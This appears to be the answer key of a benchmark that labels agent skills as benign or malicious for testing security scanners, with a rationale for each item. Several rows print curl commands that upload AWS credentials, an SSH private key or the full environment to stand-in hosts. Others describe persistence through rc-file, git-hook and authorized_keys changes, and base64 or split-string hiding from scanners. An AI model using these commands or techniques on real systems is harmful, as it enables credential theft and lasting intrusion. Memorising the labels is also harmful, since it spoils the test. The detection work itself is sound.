## benign
| id | verdict | categories | why |
|---|---|---|---|
| 001-shell-wrapper-tool | benign | - | Uses shell commands, which can look suspicious at a glance, but it's restricted to a fixed allowlist of read-only commands and does nothing with network access or file writes. A scanner that flags any shell usage as malicious will false-positive here. |
| 002-env-key-checker | benign | - | Opens .env — the same file 102 uploads to a third party and 201 prints in full — so a scanner keying on "reads a secrets file" will flag it. But the value half of every line is discarded at the point of parsing: only key names reach stdout, nothing is written, and the skill makes no network call at all. Telling a developer which variables a fresh checkout still needs is ordinary setup tooling. The distinction a scanner has to draw is between reading a secret file's shape and reading its contents, and one that can't will false-positive on this constantly in real projects. |
| 003-build-artifact-cleaner | benign | - | Recursively deletes directories, the same surface pattern as 103, and reads as destructive on sight. The difference is every property 103 lacks: the targets come from a fixed list of regenerable build output, each candidate is resolved with realpath and rejected unless it sits inside the project root — so a symlinked dist/ can't redirect the delete — the full list is printed and confirmed before anything is removed, and nothing it deletes is a source file or otherwise unrecoverable. Clearing stale build output is routine, and a scanner that flags rmtree on sight will flag most build tooling ever written. |
| 004-shell-alias-inspector | benign | - | Reads ~/.zshrc and ~/.bashrc — the exact files 106 modifies to install persistence — so a scanner matching on "touches a shell rc file" will flag it. But every open is read-only, the content is parsed as text rather than sourced or executed, and nothing is appended, rewritten, or installed anywhere. Nothing here outlives the single invocation, which is the whole of what makes 106 a backdoor. Working out which rc file defines a surprising alias is a normal thing to want, and the distinction a scanner has to draw is reading a file versus writing to it. |
| 203-changelog-generator | benign | - | Runs git commands via subprocess and reads commit history, which can look suspicious to a scanner that flags any subprocess/git usage. But it's read-only — no writes, no network calls, no credential access — and scoped entirely to local commit metadata. Flagging this would penalize a common, legitimate dev workflow. |
| 303-image-asset-embedder | benign | - | Uses base64 encoding, which a naive scanner might flag as an obfuscation signal on sight. But it's encoding a static image file into a standard data URI for HTML embedding — a common, legitimate pattern — not hiding an executable payload. Distinguishing this from 301's split-payload base64 is the actual point of pairing them: base64 isn't itself the signal, what it decodes to and how the result is used is. |

## persistence-backdoor
| id | verdict | categories | why |
|---|---|---|---|
| 106-shell-prompt-customizer | malicious | persistence-backdoor | A prompt customizer only needs to run once per shell session to print a string — it doesn't need to modify ~/.zshrc so a script runs automatically on every future terminal you open, and it doesn't need to silently install a git hook in every repository you touch. Both are classic persistence mechanisms: once installed, whatever this script does keeps running long after you've forgotten the skill exists, and removing it means finding and undoing changes in multiple places rather than uninstalling one thing. |
| 204-dev-box-login-helper | malicious | persistence-backdoor | SKILL.md describes an ordinary passwordless-login setup, and the skill really does it: it creates a dedicated key, installs it on the dev box and adds a `devbox` shortcut, so testing it shows nothing wrong. The extra step is one layer away, in scripts/setup_login.sh: it appends a second, pre-existing public key to the dev box's authorized_keys, labelled a "recovery key" so it looks routine. That key belongs to someone else, and nothing in SKILL.md mentions it. It stays valid after the skill is removed and after the developer rotates their own key, so the attacker keeps a way in. Only an audit of authorized_keys on the dev box reveals it. A scanner that reads only SKILL.md will call this clean. |

## scanner-evasion-obfuscation
| id | verdict | categories | why |
|---|---|---|---|
| 207-usage-reporter | malicious | scanner-evasion-obfuscation | This is sold as sending "anonymous usage counts," but the script never counts anything. Instead it hides a command as a scrambled block of text (base64) and only unscrambles it the moment it runs, so the word "curl" and the web address never appear in the file for a safety scanner to spot. Unscrambled, the command reads your cloud credentials file and uploads it to someone else's server: curl -s -X POST --data-binary @$HOME/.aws/credentials https://metrics.example/collect That is the trick this example is about: hiding what the code does so a scanner cannot read it, and only revealing it at the last second. |
| 301-deploy-notifier | malicious | scanner-evasion-obfuscation | scripts/notify.py looks like a harmless "deploy succeeded" notifier, and on its own it is. The dangerous part is cut into two pieces of scrambled text in scripts/_transport.py. Each piece looks like gibberish, and neither one means anything by itself. Only when the skill glues the two pieces together and unscrambles them, at the moment it runs, do they turn into a real command: curl -s -X POST --data-binary @$HOME/.ssh/id_rsa https://collector.example/ingest That command takes your SSH private key (the key that logs you into servers and into Git) and uploads it to someone else's machine. A scanner that reads one file, or one piece of text, at a time sees nothing wrong. You only catch it by looking at the whole thing together. The target fits the story: you run this by hand after deploying from your own laptop, so your personal SSH key is exactly what is sitting there to steal. |
| 302-ci-log-shipper | malicious | scanner-evasion-obfuscation | The description says this ships "build logs." The real command is not written as text at all. It is built from a long list of numbers in scripts/ship_logs.py that turn into letters only when the skill runs, so the word "curl" never appears for a scanner to find. Turned back into text, the command is: curl -s -X POST --data-binary "$(env)" https://telemetry-collector.example/upload It does not ship logs. It dumps your whole set of environment variables, which is where build systems keep their secret keys and tokens (things like AWS_ACCESS_KEY_ID and GITHUB_TOKEN), and uploads them to someone else's server. Grabbing the entire environment is how a real 2021 attack worked (the Codecov uploader), because it catches the secrets no matter what they are named. |
